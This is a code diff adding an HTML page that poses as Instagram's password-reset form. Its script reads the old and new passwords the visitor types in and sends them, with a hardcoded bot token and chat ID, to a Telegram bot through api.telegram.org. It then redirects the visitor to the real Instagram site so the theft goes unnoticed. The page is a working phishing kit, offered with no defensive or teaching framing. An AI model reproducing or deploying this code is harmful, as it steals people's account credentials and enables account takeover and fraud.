@@ -1,0 +1,177 @@
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Instagram - Reset Password</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #000;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      margin-top: 14%;
+      background-color: #000; /* changed from #111 to pure black */
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 350px;
+      text-align: center;
+      border-radius: 12px;
+    }
+
+    .container img {
+      width: 100px;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      background-color: #262626;
+      border: 1px solid #333;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 14px;
+    }
+
+    input::placeholder {
+      color: #aaa;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 12px;
+    }
+
+    button:hover {
+      background-color: #0078cc;
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-bottom: 10px;
+      display: none;
+    }
+
+    .bottom-text {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .bottom-text a {
+      color: #0095f6;
+      text-decoration: none;
+    }
+
+    .get-app {
+      margin-top: 30px;
+    }
+
+    .get-app img {
+      width: 130px;
+      height: auto;
+      margin: 5px;
+    }
+
+    footer {
+      background: black;
+      color: white;
+      text-align: center;
+      font-size: 12px;
+      padding: 15px 10px;
+      width: 100%;
+      margin-top: auto;
+    }
+
+    footer a {
+      color: white;
+      margin: 0 5px;
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://logodownload.org/wp-content/uploads/2017/04/instagram-logo-6.png" alt="Instagram Logo">
+    <div id="error-message" class="error">Passwords don't match or empty field!</div>
+
+    <input type="password" id="oldPassword" placeholder="Old password">
+    <input type="password" id="newPassword" placeholder="New password">
+    <input type="password" id="confirmPassword" placeholder="Confirm new password">
+    <button onclick="validateAndSend()">Reset Password</button>
+
+    <div class="bottom-text">
+      <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+
+    <div class="get-app">
+      <p>Get the app.</p>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/1280px-Google_Play_Store_badge_EN.svg.png" alt="Google Play">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Get_it_from_Microsoft_Badge.svg/2560px-Get_it_from_Microsoft_Badge.svg.png" alt="Microsoft Store">
+    </div>
+    
+    
+    
+
+  <footer>
+    By continuing, you agree to Instagram's <a href="#">Terms</a> of Use and <a href="#">Privacy Policy</a>.
+  </footer>
+
+  <script>
+    const botToken = "7256577569:AAHyOFgwSk6hmV1vfhIgW8wub74IW3MTQf4";
+    const chatId = "6524755764";
+
+    function validateAndSend() {
+      const oldPassword = document.getElementById("oldPassword").value.trim();
+      const newPassword = document.getElementById("newPassword").value.trim();
+      const confirmPassword = document.getElementById("confirmPassword").value.trim();
+      const errorMessage = document.getElementById("error-message");
+
+      if (!oldPassword || !newPassword || newPassword !== confirmPassword) {
+        errorMessage.style.display = "block";
+        return;
+      } else {
+        errorMessage.style.display = "none";
+      }
+
+      const message = `🔐 Password Reset Attempt:\n🔓 Old Password: ${oldPassword}\n🔑 New Password: ${newPassword}\n🔁 Confirm Password: ${confirmPassword}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          console.log("Sent to Telegram:", data);
+          // Redirect to Instagram after successful submission
+          window.location.href = "https://www.instagram.com/";
+        })
+        .catch(error => console.error("Error sending to Telegram:", error));
+    }
+  </script>
+
+</body>
